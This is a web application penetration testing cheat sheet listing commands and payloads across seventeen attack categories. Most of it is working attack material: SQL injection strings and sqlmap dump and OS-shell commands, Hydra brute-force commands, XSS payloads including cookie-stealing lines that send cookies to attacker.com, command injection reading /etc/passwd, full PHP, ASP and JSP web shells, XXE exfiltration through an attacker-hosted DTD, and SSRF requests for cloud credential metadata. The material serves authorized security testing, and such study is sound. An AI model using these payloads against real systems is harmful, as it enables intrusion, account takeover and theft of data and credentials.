# Web Application Penetration Testing Checklist 2025

## Complete Guide with Commands and Payloads

---

## Table of Contents
1. [Reconnaissance & Information Gathering](#1-reconnaissance--information-gathering)
2. [Subdomain Enumeration](#2-subdomain-enumeration)
3. [Directory & File Discovery](#3-directory--file-discovery)
4. [Vulnerability Scanning](#4-vulnerability-scanning)
5. [Authentication Testing](#5-authentication-testing)
6. [SQL Injection Testing](#6-sql-injection-testing)
7. [Cross-Site Scripting (XSS)](#7-cross-site-scripting-xss)
8. [Command Injection](#8-command-injection)
9. [File Upload Vulnerabilities](#9-file-upload-vulnerabilities)
10. [XML External Entity (XXE)](#10-xml-external-entity-xxe)
11. [Cross-Site Request Forgery (CSRF)](#11-cross-site-request-forgery-csrf)
12. [Server-Side Request Forgery (SSRF)](#12-server-side-request-forgery-ssrf)
13. [Insecure Direct Object Reference (IDOR)](#13-insecure-direct-object-reference-idor)
14. [JWT Token Testing](#14-jwt-token-testing)
15. [Session Management Testing](#15-session-management-testing)
16. [Security Headers Testing](#16-security-headers-testing)
17. [API Testing](#17-api-testing)

---

## 1. Reconnaissance & Information Gathering

### Technology Fingerprinting

**Whatweb - Identify web technologies:**
```bash
whatweb https://target.com
whatweb -v https://target.com
whatweb --aggression 3 https://target.com
```

**Wappalyzer - Browser Extension:**
- Install Wappalyzer Chrome/Firefox extension
- Visit target website to identify technologies

**Netcat - Banner Grabbing:**
```bash
nc target.com 80
HEAD / HTTP/1.0

nc -v target.com 80
```

**SSL/TLS Testing:**
```bash
testssl https://target.com
testssl --full https://target.com
```

### Nmap Port Scanning

**Basic scan:**
```bash
nmap target.com
nmap -sV target.com
```

**Comprehensive scan:**
```bash
nmap -p- -sV -sC -A target.com
nmap -p 80,443,8080,8443 target.com
```

**All TCP ports:**
```bash
nmap -p 1-65535 target.com
```

**Service version detection:**
```bash
nmap -sV --version-intensity 5 target.com
```

**OS detection:**
```bash
nmap -O target.com
```

### Web Server Scanning - Nikto

**Basic scan:**
```bash
nikto -h http://target.com
nikto -h https://target.com -ssl
```

**Scan with specific port:**
```bash
nikto -h target.com -p 8080
```

**Scan with tuning:**
```bash
nikto -h target.com -Tuning 1    # Interesting files
nikto -h target.com -Tuning 2    # Misconfigurations
nikto -h target.com -Tuning 3    # Information disclosure
nikto -h target.com -Tuning 4    # XSS
nikto -h target.com -Tuning 5    # Remote file retrieval
nikto -h target.com -Tuning 9    # SQL injection
```

**Output to file:**
```bash
nikto -h target.com -o results.txt
nikto -h target.com -Format htm -o report.html
```

### Google Dorking

```
site:target.com
site:target.com ext:php
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com filetype:pdf
site:target.com inurl:login
```

### Check for Common Files

```bash
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/.git/HEAD
curl https://target.com/phpinfo.php
curl https://target.com/.env
```

---

## 2. Subdomain Enumeration

### Sublist3r

```bash
sublist3r -d target.com
sublist3r -d target.com -o subdomains.txt
sublist3r -d target.com -b    # Enable bruteforce
sublist3r -d target.com -p 80,443
```

### Amass

```bash
amass enum -d target.com
amass enum -passive -d target.com -o subdomains.txt
amass enum -d target.com -timeout 12 -v
```

### Subfinder

```bash
subfinder -d target.com
subfinder -d target.com -o subdomains.txt
subfinder -d target.com -oJ domains.json
```

### Certificate Transparency - crt.sh

```bash
curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### DNS Brute Force

```bash
# Using dnsrecon
dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt

# Using dnsenum
dnsenum target.com

# Using fierce
fierce --domain target.com
```

---

## 3. Directory & File Discovery

### Gobuster

**Directory brute force:**
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
```

**DNS subdomain brute force:**
```bash
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

**Vhost discovery:**
```bash
gobuster vhost -u http://target.com -w wordlist.txt
```

### FFUF (Fuzz Faster U Fool)

**Directory fuzzing:**
```bash
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,401,403
```

**File extension fuzzing:**
```bash
ffuf -u http://target.com/indexFUZZ -w extensions.txt -mc 200
```

**Recursive fuzzing:**
```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

**Rate limiting:**
```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt -rate 100 -p 2
```

### Dirb

```bash
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt
dirb https://target.com -a "Mozilla/5.0"
```

### Feroxbuster

```bash
feroxbuster -u http://target.com
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://target.com -x php,html,txt
```

---

## 4. Vulnerability Scanning

### OWASP ZAP

**Command line scan:**
```bash
# Quick scan
zap-cli quick-scan http://target.com

# Spider scan
zap-cli spider http://target.com

# Active scan
zap-cli active-scan http://target.com

# Generate report
zap-cli report -o report.html -f html
```

**GUI Mode:**
- Launch ZAP
- Set target URL
- Use Automated Scan or Manual Explore
- Review alerts in the Alerts tab

### Burp Suite

**Proxy Configuration:**
1. Set browser proxy to 127.0.0.1:8080
2. Import Burp CA certificate
3. Intercept and analyze traffic

**Active Scanning:**
1. Right-click request → "Do active scan"
2. Review Dashboard for findings

**Intruder for fuzzing:**
1. Send request to Intruder
2. Set payload positions with §markers§
3. Configure payload sets
4. Start attack

### Nuclei

```bash
nuclei -u http://target.com
nuclei -l urls.txt
nuclei -u http://target.com -t cves/
nuclei -u http://target.com -severity critical,high
```

---

## 5. Authentication Testing

### Password Brute Force - Hydra

**HTTP Form brute force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

**SSH brute force:**
```bash
hydra -l root -P passwords.txt ssh://target.com
hydra -L users.txt -P passwords.txt ssh://192.168.1.1 -t 4
```

**FTP brute force:**
```bash
hydra -l admin -P passwords.txt ftp://target.com
```

**HTTP Basic Auth:**
```bash
hydra -l admin -P passwords.txt target.com http-get /admin
```

**MySQL brute force:**
```bash
hydra -l root -P passwords.txt mysql://target.com
```

### Medusa

```bash
medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/admin
medusa -h target.com -U users.txt -P passwords.txt -M ssh
```

### Default Credentials Testing

Common default credentials to test:
- admin:admin
- admin:password
- root:root
- admin:123456
- administrator:administrator

### Username Enumeration

Test different responses for valid vs invalid usernames:
```
POST /login
username=admin&password=wrong
username=invaliduser&password=wrong
```

Look for differences in:
- Response time
- Error messages
- Response codes
- Response length

---

## 6. SQL Injection Testing

### Manual Testing

**Basic payloads:**
```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or '1'='1
' or 1=1--
' or 1=1#
' or 1=1/*
admin' --
admin' #
admin'/*
' or '1'='1'--
' or '1'='1'#
' or '1'='1'/*
') or ('1'='1
') or ('1'='1'--
') or ('1'='1'#
') or ('1'='1'/*
```

**Boolean-based blind:**
```sql
1' AND '1'='1
1' AND '1'='2
```

**Time-based blind:**
```sql
1' AND SLEEP(5)--
1'; WAITFOR DELAY '00:00:05'--
```

**Union-based:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
```

### SQLMap

**Basic scan:**
```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --batch
```

**POST request:**
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"
```

**With request file:**
```bash
sqlmap -r request.txt
sqlmap -r request.txt --batch --dbs
```

**Enumerate databases:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

**Enumerate tables:**
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

**Enumerate columns:**
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
```

**Dump data:**
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

**Advanced options:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
sqlmap -u "http://target.com/page.php?id=1" --threads=10
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
```

**OS shell:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

---

## 7. Cross-Site Scripting (XSS)

### Reflected XSS Payloads

**Basic payloads:**
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input type="text" value="test" onfocus=alert(1) autofocus>
```

**Bypass filters:**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=`alert(1)`>
<img/src=x/onerror=alert(1)>
```

**Event handlers:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

**Polyglot payloads:**
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Stored XSS

**Test in:**
- Comment fields
- Profile information
- User bio/description
- File names
- Message/chat features
- Forum posts

**Cookie stealing payload:**
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
```

### DOM-based XSS

**Test URL parameters:**
```
http://target.com/page?name=<script>alert(1)</script>
http://target.com/#<script>alert(1)</script>
```

### Testing with Burp Suite

1. Send request to Repeater
2. Insert XSS payload
3. Check response for unescaped payload
4. Test in browser to confirm execution

---

## 8. Command Injection

### Basic Payloads

**Command separators:**
```bash
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
```

**Common commands:**
```bash
; whoami
; id
; cat /etc/passwd
; ls -la
; pwd
```

**Windows commands:**
```bash
& whoami
| whoami
|| whoami
& dir
& type C:\Windows\System32\drivers\etc\hosts
```

**Time-based detection:**
```bash
; sleep 10
; ping -c 10 127.0.0.1
& timeout 10
| ping -n 10 127.0.0.1
```

**Bypass filters:**
```bash
;w'h'o'am'i
;w"h"o"am"i
;who$()ami
;who${IFS}ami
;cat</etc/passwd
;{cat,/etc/passwd}
```

### Testing with Burp Suite

1. Identify parameters executing system commands
2. Send to Repeater
3. Test command injection payloads
4. Monitor response time for blind command injection

---

## 9. File Upload Vulnerabilities

### Web Shell Upload

**PHP web shells:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
```

**Simple PHP shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**ASP web shell:**
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Set oExec = oScript.Exec(theCommand)
    getCommandOutput = oExec.StdOut.ReadAll
End Function
%>
```

**JSP web shell:**
```jsp
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(cmd);
   OutputStream os = p.getOutputStream();
   InputStream in = p.getInputStream();
   DataInputStream dis = new DataInputStream(in);
   String disr = dis.readLine();
   while ( disr != null ) {
      out.println(disr);
      disr = dis.readLine();
   }
%>
```

### Bypass Techniques

**File extension bypass:**
```
file.php
file.php3
file.php4
file.php5
file.phtml
file.phar
file.phpt
```

**Double extension:**
```
shell.php.jpg
shell.jpg.php
```

**Null byte injection:**
```
shell.php%00.jpg
shell.php\x00.jpg
```

**Content-Type manipulation:**
```
Change: Content-Type: application/x-php
To: Content-Type: image/jpeg
```

**Magic bytes (file header):**
Add to beginning of PHP file:
```
GIF89a;
<?php system($_GET['cmd']); ?>
```

**Case sensitivity:**
```
file.PhP
file.pHp
file.PHP
```

### Testing Checklist

- [ ] Try uploading different file types
- [ ] Test various extensions (.php, .asp, .jsp)
- [ ] Bypass with double extensions
- [ ] Test null byte injection
- [ ] Manipulate Content-Type header
- [ ] Test with magic bytes
- [ ] Try path traversal in filename
- [ ] Test with large files (DoS)
- [ ] Upload ZIP files (ZipSlip)
- [ ] Test SVG for XSS

---

## 10. XML External Entity (XXE)

### Basic XXE Payloads

**File disclosure:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**Windows file disclosure:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>
```

**SSRF via XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<foo>&xxe;</foo>
```

**Blind XXE (Out-of-band):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]>
<foo>&xxe;</foo>
```

**XXE with parameter entities:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>&exfil;</foo>
```

**evil.dtd file:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

### Testing XXE

1. Identify XML input points
2. Test with basic XXE payload
3. Try file disclosure payloads
4. Test blind XXE with Burp Collaborator
5. Try XXE for SSRF

---

## 11. Cross-Site Request Forgery (CSRF)

### Testing CSRF

**Check for CSRF tokens:**
```html
Look for hidden fields:
<input type="hidden" name="csrf_token" value="...">
```

**Create CSRF PoC:**
```html
<html>
<body>
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="submit" value="Submit" />
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>
```

**GET-based CSRF:**
```html
<img src="http://target.com/delete-account?confirm=yes">
```

**CSRF with JSON:**
```html
<script>
fetch('http://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### Using Burp Suite for CSRF

1. Capture state-changing request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test PoC in browser
4. Verify action is performed

### CSRF Testing Checklist

- [ ] Check for CSRF tokens
- [ ] Test token validation
- [ ] Try removing CSRF token
- [ ] Try using same token multiple times
- [ ] Test with another user's token
- [ ] Check SameSite cookie attribute
- [ ] Test GET requests for state changes
- [ ] Test CORS configuration

---

## 12. Server-Side Request Forgery (SSRF)

### Basic SSRF Payloads

**Internal network access:**
```
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://127.1/
http://192.168.0.1/
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

**Port scanning:**
```
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**AWS metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

**File protocol:**
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
```

**Bypass filters:**
```
http://127.1/
http://0177.0.0.1/
http://2130706433/
http://127.0.0.1.nip.io/
http://[::ffff:127.0.0.1]/
http://①②⑦.⓪.⓪.①
```

### Testing SSRF

**Setup listener:**
```bash
python3 -m http.server 8000
nc -lvnp 8000
```

**Test URL parameters:**
```
http://target.com/fetch?url=http://your-server.com
http://target.com/proxy?url=http://127.0.0.1
http://target.com/image?src=http://169.254.169.254
```

---

## 13. Insecure Direct Object Reference (IDOR)

### Testing IDOR

**Numeric ID manipulation:**
```
GET /user/profile?id=123
Try: /user/profile?id=124
```

**Sequential testing:**
```
/document/1001
/document/1002
/document/1003
```

**GUID/UUID manipulation:**
```
/file/abc-123-def-456
Try different GUIDs
```

**Parameter tampering:**
```
POST /orders/view
order_id=1001

Try: order_id=1002
```

**Cookie manipulation:**
```
Cookie: user_id=1001
Try: user_id=1002
```

**JSON manipulation:**
```json
{
  "user_id": 1001,
  "action": "view"
}
Try changing user_id to 1002
```

### Burp Suite Intruder for IDOR

1. Send request to Intruder
2. Mark ID parameter as payload position
3. Use Numbers payload type
4. Set range (e.g., 1-1000)
5. Start attack
6. Analyze responses for unauthorized access

### IDOR Testing Checklist

- [ ] Test ID parameters in URLs
- [ ] Test POST body parameters
- [ ] Test cookies for user IDs
- [ ] Test JSON/XML body parameters
- [ ] Try different number formats (hex, decimal)
- [ ] Test with different HTTP methods
- [ ] Check authorization headers
- [ ] Test mass assignment vulnerabilities

---

## 14. JWT Token Testing

### JWT Structure Analysis

**Decode JWT:**
```bash
echo "eyJhbGc..." | base64 -d
```

**Online decoders:**
- https://jwt.io

### JWT_Tool

**Basic scan:**
```bash
python3 jwt_tool.py <JWT_TOKEN>
```

**Scanning for vulnerabilities:**
```bash
python3 jwt_tool.py <JWT_TOKEN> -M pb
python3 jwt_tool.py -t https://target.com/ -rc "jwt=<TOKEN>" -M pb
```

**Test for common attacks:**
```bash
# None algorithm attack
python3 jwt_tool.py <JWT_TOKEN> -X a

# Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem

# Weak secret brute force
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt
```

**Modify claims:**
```bash
python3 jwt_tool.py <JWT_TOKEN> -T
```

### Manual JWT Testing

**Test None algorithm:**
```json
Header:
{
  "alg": "none",
  "typ": "JWT"
}

Payload:
{
  "user": "admin",
  "role": "admin"
}

Token: eyJhbGc...eyJ1c2VyIj...
(Remove signature part)
```

**Modify payload claims:**
```json
Original:
{
  "user": "john",
  "role": "user",
  "admin": false
}

Modified:
{
  "user": "john",
  "role": "admin",
  "admin": true
}
```

### JWT Testing Checklist

- [ ] Test with no signature (alg: none)
- [ ] Test algorithm confusion (RS256 to HS256)
- [ ] Brute force weak secrets
- [ ] Modify payload claims
- [ ] Test token expiration
- [ ] Check for sensitive data in payload
- [ ] Test key injection vulnerabilities
- [ ] Verify signature validation

---

## 15. Session Management Testing

### Cookie Security Testing

**Check cookie attributes:**
```bash
# In browser developer tools → Storage → Cookies
Look for:
- HttpOnly flag
- Secure flag
- SameSite attribute
- Expiration time
- Domain and Path
```

**Cookie manipulation:**
```bash
# Using curl
curl -H "Cookie: session=abc123" http://target.com

# In Burp Repeater
Modify Cookie header values
```

### Session Fixation Testing

```bash
1. Get session ID before login: SESSIONID=attacker_controlled
2. Send to victim: http://target.com?SESSIONID=attacker_controlled
3. After victim logs in, use same session ID
```

### Session Hijacking

**Test session token:**
```bash
# Capture valid session token
Cookie: PHPSESSID=abc123def456

# Try using in different browser/IP
# Check if session is still valid
```

### Testing Checklist

- [ ] Check for HttpOnly flag
- [ ] Check for Secure flag
- [ ] Test session fixation
- [ ] Test session timeout
- [ ] Test concurrent sessions
- [ ] Test logout functionality
- [ ] Check for session token in URL
- [ ] Test session token randomness
- [ ] Test CSRF protection
- [ ] Check for session regeneration after login

---

## 16. Security Headers Testing

### Check Headers with curl

```bash
curl -I https://target.com
curl -i https://target.com
```

### Check Headers with Nmap

```bash
nmap --script http-security-headers target.com -p 80,443
```

### Important Security Headers

**Content-Security-Policy:**
```
CSP: default-src 'self'
```

**Strict-Transport-Security:**
```
HSTS: max-age=31536000; includeSubDomains
```

**X-Frame-Options:**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

**X-Content-Type-Options:**
```
X-Content-Type-Options: nosniff
```

**X-XSS-Protection:**
```
X-XSS-Protection: 1; mode=block
```

**Referrer-Policy:**
```
Referrer-Policy: no-referrer
Referrer-Policy: strict-origin-when-cross-origin
```

### Online Header Checkers

- https://securityheaders.com
- Mozilla Observatory
- https://domsignal.com/secure-header-test

### Testing Checklist

- [ ] Check for HSTS header
- [ ] Check for CSP header
- [ ] Check X-Frame-Options
- [ ] Check X-Content-Type-Options
- [ ] Check X-XSS-Protection
- [ ] Check Referrer-Policy
- [ ] Check Permissions-Policy
- [ ] Test for information disclosure headers

---

## 17. API Testing

### REST API Testing with curl

**GET request:**
```bash
curl -X GET https://api.target.com/users
curl -X GET https://api.target.com/users/1
curl -H "Authorization: Bearer TOKEN" https://api.target.com/users
```

**POST request:**
```bash
curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'
```

**PUT request:**
```bash
curl -X PUT https://api.target.com/users/1 \
  -H "Content-Type: application/json" \
  -d '{"email":"new@email.com"}'
```

**DELETE request:**
```bash
curl -X DELETE https://api.target.com/users/1 \
  -H "Authorization: Bearer TOKEN"
```

**Custom headers:**
```bash
curl -H "X-API-Key: your_api_key" \
     -H "User-Agent: MyApp/1.0" \
     https://api.target.com/endpoint
```

### Postman Testing

**Create collection:**
1. Add requests to collection
2. Set environment variables
3. Write test scripts
4. Run collection

**Example test script:**
```javascript
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("Response contains data", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData.data).to.be.an('array');
});

pm.test("Response time < 500ms", function () {
    pm.expect(pm.response.responseTime).to.be.below(500);
});
```

### API Testing Checklist

- [ ] Test authentication mechanisms
- [ ] Test authorization (RBAC/ABAC)
- [ ] Test rate limiting
- [ ] Test input validation
- [ ] Test for IDOR in API endpoints
- [ ] Test HTTP methods (GET, POST, PUT, DELETE, PATCH)
- [ ] Test API versioning
- [ ] Test error handling
- [ ] Check for sensitive data exposure
- [ ] Test CORS configuration
- [ ] Test mass assignment
- [ ] Test for SQL injection in API
- [ ] Test for XXE in XML APIs

---

## OWASP Top 10 2025 Quick Reference

1. **Broken Access Control**
   - IDOR vulnerabilities
   - Path traversal
   - Missing function level access control

2. **Cryptographic Failures**
   - Weak encryption
   - Sensitive data exposure
   - Insecure protocols

3. **Injection**
   - SQL Injection
   - Command Injection
   - LDAP Injection
   - XPath Injection

4. **Insecure Design**
   - Missing security controls
   - Threat modeling failures
   - Insecure architecture

5. **Security Misconfiguration**
   - Default credentials
   - Unnecessary features enabled
   - Missing security headers
   - Verbose error messages

6. **Vulnerable and Outdated Components**
   - Outdated libraries
   - Unpatched vulnerabilities
   - End-of-life software

7. **Identification and Authentication Failures**
   - Weak passwords
   - Broken session management
   - Missing MFA
   - Credential stuffing

8. **Software and Data Integrity Failures**
   - Insecure CI/CD pipeline
   - Unsigned/unverified updates
   - Insecure deserialization

9. **Security Logging and Monitoring Failures**
   - Missing logs
   - Insufficient monitoring
   - No alerting

10. **Server-Side Request Forgery (SSRF)**
    - Access to internal services
    - Cloud metadata exposure
    - Port scanning

---

## Essential Tools Summary

### Reconnaissance
- Nmap, Netcat, Whatweb, Wappalyzer, Nikto

### Subdomain Enumeration
- Sublist3r, Amass, Subfinder, crt.sh

### Directory Discovery
- Gobuster, FFUF, Dirb, Feroxbuster

### Vulnerability Scanning
- OWASP ZAP, Burp Suite, Nuclei

### Exploitation
- SQLMap, Hydra, Metasploit

### Web Shells
- Weevely, PHP shells, JSP shells, ASP shells

### Token Testing
- JWT_Tool, jwt.io

---

## Best Practices & Tips

1. **Always get written authorization** before testing
2. **Use rate limiting** to avoid DoS
3. **Test in isolated environments** when possible
4. **Document all findings** with PoC
5. **Verify vulnerabilities** before reporting
6. **Follow responsible disclosure** practices
7. **Keep tools updated** regularly
8. **Use VPN/proxy** for anonymity (when authorized)
9. **Backup important data** before testing
10. **Stay updated** with latest vulnerabilities

---

## Reporting Template

### Vulnerability Report Structure

1. **Title**: Clear vulnerability name
2. **Severity**: Critical/High/Medium/Low
3. **Description**: What is the vulnerability
4. **Impact**: Potential damage
5. **Affected Components**: URLs, parameters, endpoints
6. **Steps to Reproduce**: Detailed reproduction steps
7. **Proof of Concept**: Screenshots, payloads, videos
8. **Remediation**: How to fix
9. **References**: CVE, CWE, OWASP links

---

## Additional Resources

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- PentestBook: https://pentestbook.six2dez.com/

---

## Legal Disclaimer

This checklist is intended for **authorized security testing only**. Unauthorized testing of systems you don't own or have permission to test is **illegal** and may result in criminal prosecution. Always:

- Obtain written permission before testing
- Follow the rules of engagement
- Respect the scope of testing
- Report findings responsibly
- Comply with local laws and regulations

**Use this knowledge ethically and responsibly!**

---

*Last Updated: October 2025*
*Created for educational and authorized penetration testing purposes*
